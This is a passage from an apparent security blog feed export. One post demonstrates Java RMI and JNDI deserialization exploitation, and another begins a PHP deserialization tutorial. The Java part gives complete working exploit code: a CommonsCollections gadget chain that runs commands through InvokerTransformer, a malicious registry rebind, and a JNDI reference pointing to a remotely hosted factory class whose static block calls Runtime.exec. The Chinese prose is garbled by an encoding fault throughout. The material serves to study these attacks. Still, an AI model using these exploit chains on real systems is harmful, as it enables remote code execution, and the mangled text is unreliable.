implements Serializable &#123; Object obj;&#125; ÁÑ∂ÂêéÂÆ¢Êà∑Á´ØÂÆû‰æãÂåñ‰∏Ä‰∏™ExploitÂØπË±°ÔºåËÆæÁΩÆÂÆÉÁöÑobjÂ±ûÊÄß‰∏∫CommonsCollectionsÁöÑPOPÈìæÂç≥ÂèØ„ÄÇ Êîæ‰∏äDemoÁöÑ‰ª£Á†ÅÔºö 123456789101112 // ÊúçÂä°Á´ØRMIServer.java package com.test; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; public class RMIServer &#123; public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123; LocateRegistry.createRegistry(8888).bind("method",new RemoteMethodImpl()); &#125;&#125; 123456789101112131415161718192021222324//ÊúçÂä°Á´ØRemoteMethodImpl.javapackage com.test;import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class RemoteMethodImpl extends UnicastRemoteObject implements RemoteMethod &#123; protected RemoteMethodImpl() throws RemoteException &#123; &#125; @Override public String read(Exception obj) throws RemoteException &#123; return null; &#125;&#125;class Exploit implements Serializable &#123; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); &#125; Object obj;&#125; 123456789 //ÂÆ¢Êà∑Á´ØÊúçÂä°Á´ØÁõ∏ÂêåRemoteMethod.java package com.test; import java.rmi.Remote;import java.rmi.RemoteException; public interface RemoteMethod extends Remote &#123; public String read(Exception obj) throws RemoteException; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 //ÂÆ¢Êà∑Á´ØÂà©Áî®‰ª£Á†Å package com.test; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.map.LazyMap; import java.io.Serializable; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.rmi.registry.LocateRegistry; import java.util.*; public class Client &#123; public static void main(String[] args) throws Exception &#123; RemoteMethod remoteMethod = (RemoteMethod) LocateRegistry.getRegistry(8888).lookup("method"); Exploit exploit = new Exploit(); exploit.obj = getPayload(); remoteMethod.read(exploit); &#125; public static Object getPayload() throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", null&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;), new ConstantTransformer(1) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map map = LazyMap.decorate(new HashMap(), chainedTransformer); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map); Map map1 = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, invocationHandler ); Object obj = constructor.newInstance(Retention.class, map1); return obj; &#125;&#125; class Exploit implements Serializable &#123; Object obj; &#125; Âú®Ë∞ÉÁî®Ê†àÈáåÂèØ‰ª•ÁúãÂà∞ÔºåËøúÁ®ãÊñπÊ≥ïÁöÑÂèÇÊï∞ÊòØExceptionÁ±ªÔºåÂèçÂ∫èÂàóÂåñÁöÑÂØπË±°ÂÆûÈôÖ‰∏äÊòØExploit„ÄÇ Ê≥®ÂÜåÊÅ∂ÊÑèÂÆû‰æã Â¶ÇÊûúrmiregistryÂíåÊúçÂä°Á´ØÂàÜÂºÄÁöÑËØùÔºåËøôÁßçÊÉÖÂÜµÂÆûÈôÖÊîªÂáªÁöÑÊòØrmiregistry„ÄÇrmiregistryÂú®Â∞ÜÊ≥®ÂÜåÂêçÂíåRomteÂØπË±°ÁªëÂÆöÊó∂‰ºöÂ∞ÜËøô‰∏§‰∏™ÂÄºÂèçÂ∫èÂàóÂåñÔºåÂèØÂà©Áî®Ëøô‰∏™ÁâπÊÄßÂèçÂ∫èÂàóÂåñPOPÈìæ„ÄÇÂ¶ÇÊûúËøô‰∏™ÈìæÂÖ•Âè£Á±ªÊ≤°ÊúâÁªßÊâøRemoteÁ±ªÔºåÂèØ‰ª•‰ΩøÁî®Âä®ÊÄÅ‰ª£ÁêÜÁöÑÊñπÂºèÁîüÊàêRemoteÁöÑ‰ª£ÁêÜÁ±ª„ÄÇ 1234567InvocationHandler obj = (InvocationHandler) getPayload();RemoteMethod remote = (RemoteMethod) Proxy.newProxyInstance( RemoteMethod.class.getClassLoader(), new Class[]&#123;RemoteMethod.class&#125;, obj);LocateRegistry.getRegistry(8888).rebind("hack", remote); ‰∏ãÊñ≠ÁÇπÂèØ‰ª•ÁúãÂà∞ÂèçÂ∫èÂàóÂåñÊìç‰ΩúÊòØÂú®RegistryImpl_SkelÁ±ªÁöÑdispatchÊñπÊ≥ïËøõË°åÁöÑ„ÄÇ JNDIÊ≥®ÂÖ•RMIÈô§‰∫ÜÁªëÂÆöRemoteÂØπË±°‰πãÂ§ñÔºåËøòÂèØÁªëÂÆöReferenceWrapperÂØπË±°ÔºåReferenceWrapperÈáåÁöÑReferenceÂ±ûÊÄßËÆ∞ÂΩïFactoryÁ±ªÁöÑÂêçÁß∞„ÄÅÂåÖÂêçÂíåÂú∞ÂùÄ„ÄÇÂΩìInitialContextÁ±ªÊàñ‰ªñÁöÑÂ≠êÁ±ªÂØπË±°Áõ¥Êé•ÊàñÈó¥Êé•ÁöÑË∞ÉÁî®lookupÊñπÊ≥ïÔºåÂêåÊó∂nameÂèÇÊï∞ÂèØÊéßÊó∂Ôºå‰ªéJNDIÊé•Âè£Ëé∑ÂèñÊîªÂáªËÄÖÁöÑReferenceÂØπË±°ÔºåÁÑ∂Âêé‰ªéÊîªÂáªËÄÖÁöÑÊúçÂä°Âô®‰∏ãËΩΩFactoryÂπ∂ÂÆû‰æãÂåñÔºåÊîªÂáªËÄÖÂú®ÈùôÊÄÅ‰ª£Á†ÅÊàñÊûÑÈÄ†ÊñπÊ≥ïÂä†ÂÖ•ÊâßË°åÂëΩ‰ª§ÁöÑ‰ª£Á†ÅÔºåÂ∞±ËÉΩÂú®ÂÆû‰æãÂåñÁöÑÊó∂ÂÄôÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å„ÄÇ Êîæ‰∏äDemo‰ª£Á†ÅÔºö 123456789101112131415161718// RMIServer.javapackage com.test;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.*;public class RMIServer &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(8888); Reference reference = new Reference("Exploit2", "com.exploit.Exploit2", "http://127.0.0.1:8081/"); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind("calc", wrapper); &#125;&#125; 1234567891011// RMIClinet.javapackage com.test;import javax.naming.*;public class RMIClient &#123; public static void main(String[] args) throws Exception &#123; Context ctx = new InitialContext(); ctx.lookup("rmi://localhost:8888/calc"); &#125;&#125; ÊÅ∂ÊÑèÁöÑFactoryÁ±ªÔºö 1234567891011121314151617package com.exploit;import java.io.IOException;class Exploit2 &#123; static &#123; try &#123; Runtime.getRuntime().exec("calc"); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; Exploit2() throws Exception &#123; Runtime.getRuntime().exec("calc"); &#125;&#125; ÂêåÊó∂Ëµ∑‰∏Ä‰∏™pythonÁöÑSimpleHTTPServerÔºåÊù•‰Ωú‰∏∫FactroyÁ±ªÁöÑ‰∏ãËΩΩÊúçÂä°„ÄÇËøôÈáåÊúâ‰∏Ä‰∏™ÂùëÔºå‰∏ÄÂºÄÂßãÊàëÊòØÁõ¥Êé•http://127.0.0.1:8081/Exploit2.class‰∏ãËΩΩFactroyÁ±ªÔºåÂú®ÊµãËØï‰∏≠ËôΩÁÑ∂ÂèëËµ∑‰∫Ü‰∏ãËΩΩËØ∑Ê±ÇÔºå‰ΩÜÂπ∂Ê≤°ÊúâÂºπËÆ°ÁÆóÂô®Ôºå‰∏ÄÂ∫¶‰ª•‰∏∫ÊàëÁöÑ‰ª£Á†ÅÂÜôÂæóÊúâÈóÆÈ¢òÔºåÂèÇËÄÉ‰∫ÜÂà´‰∫∫ÁöÑDemo‰ª£Á†ÅÔºåfactroyLocationËÆæÁΩÆÁöÑÊòØ‰∏ãËΩΩÊúçÂä°ÁöÑÊ†πÁõÆÂΩïÔºåÁî®SimpleHTTPServerÊµãËØï‰∏ãÔºåËØ∑Ê±ÇÁöÑÂú∞ÂùÄ‰ºöÂèò‰∏∫http://127.0.0.1:8081/com/exploit/Exploit2.classÔºåÊâÄ‰ª•‰∏ãËΩΩÁõÆÂΩïË¶ÅË∑üÊä•ÂêçÁõ∏ÂêåÊàñËÄÖËØ∑Ê±Ç‰ªªÊÑèÂú∞ÂùÄÈÉΩ‰∏ãËΩΩFactroyÊâçË°å„ÄÇ ‰∏á‰∫ã‰ø±Â§áÔºåÂºÄË∞É„ÄÇ Ââç‰∏§‰∏™lookupÊñπÊ≥ïÈÉΩÊòØÂ•óÂ®ÉË∞ÉÁî®ÔºåÁõ¥Êé•Ë∑üËøõÂà∞RegistryContextÁöÑlookupÊñπÊ≥ï„ÄÇ‰ΩøÁî®ÁªëÂÆöÁöÑReferenceWrapperÂíåÂØπÂ∫îÁöÑNameË∞ÉÁî®decodeObjectÊñπÊ≥ï„ÄÇ Ë∑üËøõÂà∞decodeObjectÊñπÊ≥ïÔºåËé∑ÂèñReferenceÂØπË±°ÔºåÂπ∂‰ΩøÁî®ReferenceÂØπË±°ÂíåNameÂØπË±°Ë∞ÉÁî®getObjectInstanceÊñπÊ≥ï„ÄÇ 123456private Object decodeObject(Remote var1, Name var2) throws NamingException &#123; try &#123; Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; return NamingManager.getObjectInstance(var3, var2, this, this.environment); ...&#125; getObjectInstanceÊñπÊ≥ïÈáåÂèàÁªßÁª≠ÈÄöËøáReferenceÂØπË±°ÂíåfactoryÁ±ªÂêçË∞ÉÁî®getObjectFactoryFromReferenceÊñπÊ≥ïËé∑ÂèñÂØπË±°„ÄÇÊé•ÁùÄË∑üËøõgetObjectFactoryFromReferenceÊñπÊ≥ïÔºåÊúâ‰∏§‰∏™Âú∞ÊñπË∞ÉÁî®loadClassÔºåÊ≠§Êó∂ÁöÑË∞ÉÁî®Ê†àÊòØÁ¨¨‰∫å‰∏™loadClass„ÄÇÁ¨¨‰∏Ä‰∏™loadClassÊòØ‰ªéÂΩìÂâçclassPathËé∑ÂèñÁ±ªÁöÑClassÂÆû‰æã„ÄÇÂ¶ÇÊûúÊÅ∂ÊÑèÁ±ªÂíåÂÆ¢Êà∑Á´ØÂêåÂú®‰∏Ä‰∏™È°πÁõÆÔºåÈúÄË¶ÅÊääÊÅ∂ÊÑèÁ±ªÁºñËØëÂêéÁöÑ.classÊñá‰ª∂Âà†ÊéâÊâç‰ºö‰ªéËøúÁ®ã‰∏ãËΩΩÊÅ∂ÊÑèÁ±ª„ÄÇÂêéÁª≠Â¶Çclas‰∏∫nullÔºå‰πüÂ∞±ÊòØÊú¨Âú∞Ê≤°Ëøô‰∏™factoryÁ±ªÊó∂ÔºåËé∑ÂèñcodebaseÔºå‰πüÂ∞±ÊòØÂàùÂßãÂåñReferenceÊó∂ÁöÑfactoryNameÂ±ûÊÄßÔºåË∞ÉÁî®Âè¶‰∏Ä‰∏™loadClassÊñπÊ≥ï„ÄÇ 123456789101112131415161718192021222324static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) throws IllegalAccessException, InstantiationException, MalformedURLException &#123; Class&lt;?&gt; clas = null; // Try to use current class loader try &#123; clas = helper.loadClass(factoryName); &#125; catch (ClassNotFoundException e) &#123; // ignore and continue // e.printStackTrace(); &#125; // All other exceptions are passed up. // Not in class path; try to use codebase String codebase; if (clas == null &amp;&amp; (codebase = ref.getFactoryClassLocation()) != null) &#123; try &#123; clas = helper.loadClass(factoryName, codebase); &#125; catch (ClassNotFoundException e) &#123; &#125; &#125; return (clas != null) ? (ObjectFactory) clas.newInstance() : null; &#125; Ë∑üËøõÁ¨¨‰∫å‰∏™loadClassÔºåÈÄöËøáURLClassLoaderÁöÑnewInstanceÁîüÊàêËøúÁ®ãÁ±ªÁöÑClassLoaderÔºåÁÑ∂Âêé‰ΩøÁî®ClassLoaderÂèçÂ∞ÑÁîüÊàêfactoryÁ±ªÁöÑClassÂÆû‰æã„ÄÇÂú®ÂÆû‰æãÂåñClassÁöÑÂÆû‰æãÁöÑÊó∂ÂÄôÔºåÈùôÊÄÅ‰ª£Á†ÅÂ∞±‰ºöË¢´ÊâßË°åÔºåÂºπÂá∫ËÆ°ÁÆóÂô®„ÄÇ Èô§‰∫ÜRMIÔºåLDAP‰πüÊòØÂèØ‰ª•‰ΩøÁî®Á±ª‰ººÁöÑÊñπÂºèÂÆû‰æãÂåñËøúÁ®ãÁöÑÊÅ∂ÊÑèÁ±ªÔºåËøô‰∏§ÁßçÂà©Áî®ÊñπÊ≥ïÈÉΩÂÜôÂú®ÂêéÁª≠ËæÉÈ´òÁöÑJavaÁâàÊú¨Ë¢´ÈôêÂà∂‰ªéËøúÁ®ã‰∏ãËΩΩÂπ∂ÂÆû‰æãÂåñfactoryÁ±ª„ÄÇ com.sun.jndi.ldap.object.trustURLCodebase Â±ûÊÄßÂú® Oracle JDK 11.0.1, 8u191, 7u201, and 6u211Âèä‰ª•ÂêéÁöÑÁâàÊú¨ÔºåÈªòËÆ§ÂÄº‰∏∫falseÔºåÂç≥‰∏çÂÖÅËÆ∏LDAP‰ªéËøúÁ®ãÂú∞ÂùÄÂä†ËΩΩReferenceÂ∑•ÂéÇÁ±ª„ÄÇ com.sun.jndi.rmi.object.trustURLCodebase Â±ûÊÄßÂú® Oracle JDK 8u113, 7u122, 6u132Âèä‰ª•ÂêéÁöÑÁâàÊú¨ÔºåÈªòËÆ§ÂÄº‰∏∫falseÔºåÂç≥ÈªòËÆ§‰∏çÂÖÅËÆ∏RMI‰ªéËøúÁ®ãÂú∞ÂùÄÂä†ËΩΩReferenceÂ∑•ÂéÇÁ±ª„ÄÇ ÂêéËÆ∞Ë∑ùÂèëÂ∏É‰∏ä‰∏ÄÁØáÊñáÁ´†24Â§©Ôºå‰Ω†ÊñáÁ´†ÂÜôÂø´ÁÇπÂêßÂ§ßÂì•ÔºåÁÇíÂÜ∑È•≠ÊêûËøô‰πà‰πÖ„ÄÇÂêéÁª≠Â§çÁé∞‰∏ã‰∏Ä‰∫õÁªÑ‰ª∂„ÄÅCMSÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ ÂèÇËÄÉhttps://github.com/bit4woo/code2sec.com https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#5-2-Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86 https://yoga7xm.top/2019/09/02/rmi/ https://paper.seebug.org/1091/#java-rmi_3 https://paper.seebug.org/1420/#_2 https://www.redteaming.top/2020/08/24/JNDI-Injection/]]></content>
      <categories>
        <category>‰ª£Á†ÅÂÆ°ËÆ°</category>
      </categories>
      <tags>
        <tag>ÂèçÂ∫èÂàóÂåñ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpÂèçÂ∫èÂàóÂåñÊµÖÊûê]]></title>
    <url>%2F2021%2F07%2F30%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøõÈò∂ÁöÑ‰ª£Á†ÅÂÆ°ËÆ°ÔºåÂèçÂ∫èÂàóÂåñÊòØÁªï‰∏çËøáÁöÑÂùéÂïä„ÄÇ‰∏ªÊµÅÁöÑÂá†‰∏™WebÂºÄÂèëËØ≠Ë®ÄÔºåÂÉèphp„ÄÅC#„ÄÅJavaÈÉΩÊúâÂèçÂ∫èÂàóÂåñÔºåÂÖ∂‰∏≠Â∞±Â±ûphpÁöÑÂèçÂ∫èÂàóÂåñÁÆÄÂçïÊòìÊáÇÔºåÂèçÂ∫èÂàóÂåñÁöÑÂ≠¶‰π†‰πãË∑ØÂ∞±‰ªéËøôÈáåÂºÄÂßã„ÄÇ ‰ªÄ‰πàÊòØÂèçÂ∫èÂàóÂåñÂ¶ÇÊûúÊÉ≥Ë¶ÅÊåÅ‰πÖÂåñ‰øùÂ≠ò‰∏Ä‰∏™ÂØπË±°ÔºåÈô§‰∫ÜÂ∞ÜÂØπË±°ÁöÑÂÜÖÂÆπ‰øùÂ≠òÂú®Êï∞ÊçÆÂ∫ì‰∏≠ÔºåËøòËÉΩÂ∞ÜÂØπË±°Â∫èÂàóÂåñÔºå‰ΩøÂÖ∂ËΩ¨Êç¢‰∏∫‰∏Ä‰∏≤Êï∞ÊçÆ„ÄÇÂ∫èÂàóÂåñ‰ΩøÂæóÂØπË±°ÁöÑ‰øùÂ≠òÂíå‰º†ËæìÂèòÂæóÊõ¥‰∏∫ÁÆÄ‰æøÔºåÂÖ∂‰∏≠Â∫èÂàóÂåñÁöÑÂØπË±°ÂèØ‰ª•ÊòØÁ±ªÂØπË±°„ÄÅÂèòÈáè„ÄÅÊï∞ÁªÑÁ≠â„ÄÇÂØπË±°ÁöÑËøòÂéüÂàôÈÄöËøáÂèçÂ∫èÂàóÂåñÂÆûÁé∞„ÄÇ PHPÂèçÂ∫èÂàóÂåñÊ†ºÂºèÂ∫èÂàóÂåñÁöÑÂØπË±°Êúâ‰∏çÂêåÁöÑÁ±ªÂûãÔºå‰∏∫‰∫ÜÂå∫ÂàÜ‰∏çÂêåÁöÑÁ±ªÂûãÔºåÂ∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤Ëá™ÁÑ∂Êúâ‰∏çÂêåÁöÑÊ†ºÂºè„ÄÇphpÂ∏∏ËßÅÁöÑÁ±ªÂûãÂ∫èÂàóÂåñÂêéÁöÑÂÜÖÂÆπÂ¶Ç‰∏ãÔºö 1234567891011121314151617181920212223&lt;?php$str = "str";$int = 1;$float = 1.1;$obj = new DateTime();$arr = array(1);$bool = true;$null = null;echo serialize($str);echo "&lt;br&gt;";echo serialize($int);echo "&lt;br&gt;";echo serialize($float);echo "&lt;br&gt;";echo serialize($obj);echo "&lt;br&gt;";echo serialize($arr);echo "&lt;br&gt;";echo serialize($bool);echo "&lt;br&gt;";echo serialize($null) ÂºÄÂ§¥ÁöÑ‰∏Ä‰∏™Â≠óÁ¨¶‰ª£Ë°®Á±ªÂûãÔºåÂêéÈù¢Ë∑üÁùÄ‰∏Ä‰∏™ÂÜíÂè∑:Áî®‰∫éÂàÜÈöîÁ±ªÂûãÂíåÂÄºÔºõÂØπ‰∫éÂ≠óÁ¨¶‰∏≤Á±ªÂûã„ÄÅÂèòÈáèÂêçÂíåÁ±ªÂêçÔºå‰ª£Ë°®Á±ªÂûãÁöÑÂ≠óÁ¨¶ÂêéËøòË∑üÁùÄ‰∏Ä‰∏™Êï∞Â≠óÔºåÁî®‰∫éÊèèËø∞ÂêéÈù¢Â≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶ÔºõÁõ∏ÂêåÁöÑÔºåÁ±ªÂØπË±°ÂíåÊï∞ÁªÑ‰πüÂ≠òÂú®‰∏Ä‰∏™Êï∞Â≠óÁî®‰∫éÊèèËø∞Á±ªÂØπË±°Â±ûÊÄßÊï∞ÈáèÊàñÊï∞ÁªÑÈïøÂ∫¶ÔºåÂÖ∂‰∏≠Â±ûÊÄßÊàñÊï∞ÁªÑÂÜÖÂÆπÁî®‰∏ÄÂØπËä±Êã¨Âè∑Êã¨Ëµ∑Êù•ÔºåËä±Êã¨Âè∑ÈáåÂèØ‰ª•ÂµåÂ•óÂÖ∂‰ªñÁ±ªÂûãÁöÑÂ∫èÂàóÂåñÂÜÖÂÆπ „ÄÇ Èô§Ê≠§‰πãÂ§ñËøòÊúâ‰∏§‰∏™‰∏çÂ∏∏ËßÅÔºå‰ΩÜÂÄºÂæóÂÖ≥Ê≥®ÁöÑÁ±ªÂûãÊèèËø∞Á¨¶ÔºöÂ§ßÂÜôSÂíåÂ§ßÂÜôRÔºåÂ§ßÂÜôSÂèØ‰ª•‰º†ÂÖ•hexÁºñÁ†ÅÁöÑÂ≠óÁ¨¶ÔºåÂ§ßÂÜôRÂèØ‰ª•‰ªéÂ∑¶Âà∞Âè≥‰∏éÁ¨¨n‰∏™ÂèçÂ∫èÂàóÂåñÁöÑÂèòÈáèËøõË°åÁªëÂÆö„ÄÇ 123456789101112&lt;?php$hex = 'S:3:"\31\32\33";';$res = 'a:2:&#123;s:3:"abc";s:3:"abc";s:3:"res";R:2;&#125;';echo unserialize($hex);echo "&lt;br&gt;";$arr = unserialize($res);echo var_dump($arr);echo "&lt;br&gt;";$arr["abc"] = "def";echo var_dump($arr) ÂØπ‰∫éphpÁöÑÁ±ªÔºåÂÖ∂Â±ûÊÄßÁöÑËÆøÈóÆ‰øÆÈ•∞Á¨¶Êúâ‰∏âÁßçÔºöpublic„ÄÅprotectedÂíåprivateÔºåÂ∫èÂàóÂåñÂå∫ÂàÜËÆøÈóÆ‰øÆÈ•∞Á¨¶ÊòØÈÄöËøáÂ±ûÊÄßÁöÑÊ†áËÆ∞ÂÆûÁé∞ÁöÑ„ÄÇÂ∫èÂàóÂåñÊó∂ÂèØËÉΩ‰ºöÁúãÂà∞Â±ûÊÄßÂêçÁöÑÈïøÂ∫¶ÂíåÊèèËø∞ÁöÑÈïøÂ∫¶‰∏ç‰∏ÄËá¥ÔºåÊòØÂõ†‰∏∫protectedÂíåprivate‰øÆÈ•∞ÁöÑÂèòÈáèÂêçÂú®ÁªèËøáÂ∫èÂàóÂåñÂêéÂåÖÂê´‰∫Ü‰∏çÂèØËßÅÁöÑ00Â≠óÁ¨¶„ÄÇ ‰∏ãÂàó‰ª£Á†ÅÂ∞ÜÂ∫èÂàóÂåñÂêéÁöÑ00Â≠óÁ¨¶ÊõøÊç¢‰∏∫urlÁºñÁ†ÅÔºåÂ∞±ÂèØ‰ª•ÂæàÁõ¥ËßÇÁöÑÁúãÂà∞ÂÆÉÁöÑ‰ΩçÁΩÆ„ÄÇprotected‰øÆÈ•∞Á¨¶ÁöÑÊ†ºÂºè‰∏∫Ôºö%00*%00Â±ûÊÄßÂêçÔºåprivate‰øÆÈ•∞Á¨¶ÁöÑÊ†ºÂºè‰∏∫Ôºö%00Á±ªÂêç%00Â±ûÊÄßÂêçÔºåpublic‰øÆÈ•∞Á¨¶ÂàôÁõ¥Êé•‰∏∫Â±ûÊÄßÂêç„ÄÇ 12345678910&lt;?phpclass Test&#123; public $public; protected $protected; private $private;&#125;echo str_replace("\x00","%00",serialize(new Test())); PHPÈ≠îÊúØÂáΩÊï∞ÂèçÂ∫èÂàóÂåñ‰∏ç‰ºöÁõ¥Êé•ÊéßÂà∂‰ª£Á†ÅÁöÑÊâßË°åÊµÅÁ®ãÔºå‰ΩÜÈÄöËøáÁâπÂÆöÊù°‰ª∂‰∏ã‰ºöË¢´Ëá™Âä®Ë∞ÉÁî®ÁöÑÈ≠îÊúØÊñπÊ≥ïÊûÑÊàêPOPÈìæÔºåÂèØ‰ª•ÂÆûÁé∞ÂëΩ‰ª§ÊâßË°å„ÄÅÊñá‰ª∂ËØªÂÜôÁ≠âÂäüËÉΩ„ÄÇPHP‰∏≠ÊâÄÊúâÁöÑÈ≠îÊúØÊñπÊ≥ïÂíå‰ΩúÁî®Â¶Ç‰∏ãÔºö ÊñπÊ≥ïÂêç ‰ΩúÁî® __construct ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂú®ÂàõÂª∫ÂØπË±°Êó∂ÂÄôÂàùÂßãÂåñÂØπË±°Ôºå‰∏ÄËà¨Áî®‰∫éÂØπÂèòÈáèËµãÂàùÂÄº __destruct ÊûêÊûÑÂáΩÊï∞ÔºåÂíåÊûÑÈÄ†ÂáΩÊï∞Áõ∏ÂèçÔºåÂú®ÂØπË±°‰∏çÂÜçË¢´‰ΩøÁî®Êó∂(Â∞ÜÊâÄÊúâËØ•ÂØπË±°ÁöÑÂºïÁî®ËÆæ‰∏∫null)ÊàñËÄÖÁ®ãÂ∫èÈÄÄÂá∫Êó∂Ëá™Âä®Ë∞ÉÁî® __toString ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´ÂΩì‰Ωú‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ë¢´Ë∞ÉÁî®ÔºåÊääÁ±ªÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ëß¶ÂèëÔºåËøîÂõûÂÄºÈúÄË¶Å‰∏∫Â≠óÁ¨¶‰∏≤Ôºå‰æãÂ¶ÇechoÊâìÂç∞Âá∫ÂØπË±°Â∞±‰ºöË∞ÉÁî®Ê≠§ÊñπÊ≥ï __wakeup ‰ΩøÁî®unserializeÊó∂Ëß¶ÂèëÔºåÂèçÂ∫èÂàóÂåñÊÅ¢Â§çÂØπË±°‰πãÂâçË∞ÉÁî®ËØ•ÊñπÊ≥ï __sleep ‰ΩøÁî®serializeÊó∂Ëß¶Âèë ÔºåÂú®ÂØπË±°Ë¢´Â∫èÂàóÂåñÂâçËá™Âä®Ë∞ÉÁî®ÔºåËØ•ÂáΩÊï∞ÈúÄË¶ÅËøîÂõû‰ª•Á±ªÊàêÂëòÂèòÈáèÂêç‰Ωú‰∏∫ÂÖÉÁ¥†ÁöÑÊï∞ÁªÑ(ËØ•Êï∞ÁªÑÈáåÁöÑÂÖÉÁ¥†‰ºöÂΩ±ÂìçÁ±ªÊàêÂëòÂèòÈáèÊòØÂê¶Ë¢´Â∫èÂàóÂåñ„ÄÇÂè™ÊúâÂá∫Áé∞Âú®ËØ•Êï∞ÁªÑÂÖÉÁ¥†ÈáåÁöÑÁ±ªÊàêÂëòÂèòÈáèÊâç‰ºöË¢´Â∫èÂàóÂåñ) __call Âú®ÂØπË±°‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶ÂèëÔºåÂç≥ÂΩìË∞ÉÁî®ÂØπË±°‰∏≠‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ï‰ºöËá™Âä®Ë∞ÉÁî®ËØ•ÊñπÊ≥ï __callStatic Âú®ÈùôÊÄÅ‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë __get ËØªÂèñ‰∏çÂèØËÆøÈóÆÁöÑÂ±ûÊÄßÁöÑÂÄºÊó∂‰ºöË¢´Ë∞ÉÁî®Ôºà‰∏çÂèØËÆøÈóÆÂåÖÊã¨ÁßÅÊúâÂ±ûÊÄßÔºåÊàñËÄÖÊ≤°ÊúâÂàùÂßãÂåñÁöÑÂ±ûÊÄßÔºâ __set Âú®Áªô‰∏çÂèØËÆøÈóÆÂ±ûÊÄßËµãÂÄºÊó∂ÔºåÂç≥Âú®Ë∞ÉÁî®ÁßÅÊúâÂ±ûÊÄßÁöÑÊó∂ÂÄô‰ºöËá™Âä®ÊâßË°å __isset ÂΩìÂØπ‰∏çÂèØËÆøÈóÆÂ±ûÊÄßË∞ÉÁî®isset()Êàñempty()Êó∂Ëß¶Âèë __unset ÂΩìÂØπ‰∏çÂèØËÆøÈóÆÂ±ûÊÄßË∞ÉÁî®unset()Êó∂Ëß¶Âèë __invoke ÂΩìËÑöÊú¨Â∞ùËØïÂ∞ÜÂØπË±°Ë∞ÉÁî®‰∏∫ÂáΩÊï∞Êó∂Ëß¶Âèë __serialize serialize()ÂáΩÊï∞‰ºöÊ£ÄÊü•Á±ª‰∏≠ÊòØÂê¶Â≠òÂú®‰∏Ä‰∏™È≠îÊúØÊñπÊ≥ï __serialize()„ÄÇÂ¶ÇÊûúÂ≠òÂú®ÔºåËØ•ÊñπÊ≥ïÂ∞ÜÂú®‰ªª‰ΩïÂ∫èÂàóÂåñ‰πãÂâç‰ºòÂÖàÊâßË°å„ÄÇÂ¶ÇÊûúÁ±ª‰∏≠ÂêåÊó∂ÂÆö‰πâ‰∫Ü __serialize() Âíå __sleep() ‰∏§‰∏™È≠îÊúØÊñπÊ≥ïÔºåÂàôÂè™Êúâ __serialize() ÊñπÊ≥ï‰ºöË¢´Ë∞ÉÁî®„ÄÇ __unserialize unserialize()ÂáΩÊï∞Ê£ÄÊü•ÊòØÂê¶Â≠òÂú®È≠îÊúØÊñπÊ≥ï__unserialize()„ÄÇÂ¶ÇÊûúÂ≠òÂú®ÔºåÊ≠§ÂáΩÊï∞Â∞ÜÊé•Êî∂‰ªé__serialize()ËøîÂõûÁöÑÊï∞ÁªÑÔºåÁÑ∂ÂêéÊ†πÊçÆÈúÄË¶Å‰ªéËØ•Êï∞ÁªÑ‰∏≠ÊÅ¢Â§çÂØπË±°ÁöÑÂ±ûÊÄß„ÄÇ __set_status Ëµ∑ÂΩìË∞ÉÁî® var_export()ÂØºÂá∫Á±ªÊó∂ÔºåÊ≠§ÊñπÊ≥ï‰ºöË¢´Ë∞ÉÁî®„ÄÇ __clone ‰ΩøÁî®cloneÂÖ≥ÈîÆÂ≠óÊù•ËøõË°åÂØπË±°Â§çÂà∂Êó∂__cloneÊñπÊ≥ï‰ºöË¢´Ë∞ÉÁî®„ÄÇ __debugInfo 